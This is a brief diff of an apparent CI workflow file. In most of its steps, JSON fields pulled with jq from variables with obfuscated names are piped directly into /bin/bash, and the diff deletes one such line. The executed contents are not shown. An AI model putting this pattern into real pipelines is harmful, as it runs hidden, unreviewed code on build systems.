@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$w884" | jq -r .lj4 | /bin/bash
           printf '%s' "$orf86" | jq -r .xhzjq6431 | /bin/bash
           printf '%s' "$wbpr97" | jq -r .ugli85 | /bin/bash
-          echo $dfcda3294 | jq -r .dmz539 | /bin/bash
           echo $pu96421 | jq -r .epmkn55 | /bin/bash
 
       - name: Upload artifact
